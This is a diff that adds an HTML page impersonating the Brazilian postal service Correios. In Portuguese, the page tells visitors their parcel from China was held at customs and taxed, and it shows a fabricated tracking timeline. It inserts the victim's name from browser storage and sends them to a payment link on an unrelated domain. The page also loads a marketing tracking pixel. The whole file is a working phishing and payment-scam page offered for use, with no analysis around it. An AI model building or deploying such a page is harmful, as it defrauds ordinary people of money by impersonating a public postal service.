@@ -1,0 +1,257 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <script>
+        window.pixelId = "6739662c70a265d839cf4ebd";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+      </script>
+      
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Status do Pedido - Correios</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            min-height: 100vh;
+            width: 100vw;
+        }
+        .header {
+            width: 100%;
+            background-color: #f5f4f4;
+            text-align: center;
+            padding: 10px 0;
+            border-bottom: 2px solid #e6e6e6;
+        }
+        .logo {
+            width: 190px;
+            max-width: 80%;
+            margin-bottom: 5px;
+        }
+        .yellow-line {
+            width: 100%;
+            height: 5px;
+            background-color: #f1c40f;
+            margin-top: 20px;
+        }
+        .alert {
+            color: red;
+            font-weight: bold;
+            font-size: 16px;
+            margin: 10px auto;
+            text-align: center;
+            width: 90%;
+            max-width: 600px;
+        }
+        .status-container {
+            text-align: center;
+            margin-top: 15px;
+        }
+        .status-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #0056b3;
+        }
+        .status-subtitle {
+            font-size: 16px;
+            color: #f1c40f;
+            font-weight: bold;
+            margin-top: 5px;
+        }
+        p {
+            color: #333;
+            text-align: center;
+            margin: 10px 20px;
+            width: 90%;
+        }
+        .barcode-section {
+            position: relative;
+            width: 90%;
+            max-width: 600px;
+            margin: 20px auto;
+        }
+        .barcode-image {
+            width: 100%;
+            border-radius: 10px;
+        }
+        .recipient-name {
+            position: absolute;
+            top: 56%;
+            left: 57%;
+            transform: translate(-50%, -50%);
+            font-size: 14px;
+            font-weight: bold;
+            color: #2e2e2e;
+        }
+        .tracking-info {
+            width: 90%;
+            max-width: 600px;
+            margin: 20px auto;
+            font-size: 14px;
+        }
+        .tracking-item {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 15px;
+        }
+        .tracking-item img {
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+        }
+        .tracking-text {
+            flex-grow: 1;
+        }
+        .tracking-date {
+            color: #777;
+            font-size: 12px;
+        }
+        .delivery-info {
+            text-align: center;
+            color: orange;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+        .footer {
+            background-color: #ffcc00;
+            padding: 20px 0;
+            color: #333;
+            text-align: center;
+            font-size: 14px;
+            width: 100%;
+        }
+        .footer a {
+            color: #333;
+            text-decoration: none;
+            margin: 5px;
+            display: inline-block;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .button {
+            background-color: #004080;
+            color: white;
+            padding: 15px;
+            text-decoration: none;
+            border-radius: 5px;
+            display: block;
+            text-align: center;
+            margin: 20px auto;
+            width: 80%;
+            max-width: 300px;
+            cursor: pointer;
+        }
+        .button:hover {
+            background-color: #003366;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header com logo e linha amarela -->
+    <div class="header">
+        <img src="images/logo.png" alt="Correios Logo" class="logo">
+        <div class="yellow-line"></div>
+    </div>
+
+    <!-- Mensagem de alerta -->
+    <div class="alert">Sua encomenda foi barrada em nossa central.</div>
+
+    <!-- Status do pedido -->
+    <div class="status-container">
+        <div class="status-title">STATUS DO PEDIDO:</div>
+        <div class="status-subtitle">AGUARDANDO PAGAMENTO</div>
+    </div>
+
+    <!-- Mensagem de instrução -->
+    <p>Seu pedido passou por um processo na alfândega e foi taxado. Solicitamos a gentileza de realizar o pagamento para liberar o envio do seu produto. O pagamento deve ser feito clicando no botão abaixo:</p>
+
+    <!-- Seção do pacote -->
+    <div class="barcode-section">
+        <img src="images/1.png" alt="Etiqueta Correios" class="barcode-image">
+        <div id="recipientName" class="recipient-name">Nome não encontrado</div>
+    </div>
+
+    <!-- Informações de rastreamento -->
+    <div class="tracking-info">
+        <div class="tracking-item">
+            <img src="images/7.png" alt="Status">
+            <div class="tracking-text">
+                Aguardando Pagamento - Curitiba - PR
+                <div class="tracking-date">02/11/2024 11:30</div>
+            </div>
+        </div>
+        <div class="tracking-item">
+            <img src="images/8.png" alt="Status">
+            <div class="tracking-text">
+                Encaminhado para fiscalização aduaneira - Curitiba - PR
+                <div class="tracking-date">25/10/2024 15:42</div>
+            </div>
+        </div>
+        <div class="tracking-item">
+            <img src="images/9.png" alt="Status">
+            <div class="tracking-text">
+                Objeto recebido pelos Correios do Brasil - Curitiba - PR
+                <div class="tracking-date">20/10/2024 17:26</div>
+            </div>
+        </div>
+        <div class="tracking-item">
+            <img src="images/10.png" alt="Status">
+            <div class="tracking-text">
+                Objeto em trânsito - Para Unidade de Tratamento Internacional - BR
+                <div class="tracking-date">15/10/2024 13:22</div>
+            </div>
+        </div>
+        <div class="tracking-item">
+            <img src="images/11.png" alt="Status">
+            <div class="tracking-text">
+                Objeto Postado - CHINA
+                <div class="tracking-date">03/10/2024 09:02</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Informações sobre o prazo de entrega -->
+    <div class="delivery-info">
+        PRAZO DE ENTREGA APÓS O PAGAMENTO: 3 DIAS ÚTEIS
+    </div>
+    <a href="https://pay.entregando-produtos.com/mwK436y2oxwgQ8b" + window.location.search; class="button">CLIQUE AQUI PARA EFETUAR O PAGAMENTO</a>
+
+    <!-- Rodapé com links -->
+    <div class="footer">
+        <a href="#">Registro de manifestações</a>
+        <a href="#">Acompanhamento de manifestações</a>
+        <a href="#">Central de Atendimento</a>
+        <a href="#">Atendimento Comercial</a>
+        <a href="#">Ouvidoria</a>
+        <a href="#">Denúncia</a>
+        <p>© Copyright 2024 Correios - Todos os direitos reservados</p>
+    </div>
+
+    <script>
+        // Função para buscar o nome salvo no localStorage
+        window.onload = function() {
+            const nomeCompleto = localStorage.getItem('nome');
+            if (nomeCompleto) {
+                const nomes = nomeCompleto.split(" ");
+                const primeiroESegundoNome = nomes.slice(0, 2).join(" ");
+                document.getElementById('recipientName').textContent = primeiroESegundoNome;
+            } else {
+                document.getElementById('recipientName').textContent = 'Nome não encontrado';
+            }
+        }
+    </script>
+
+
+</body></html>
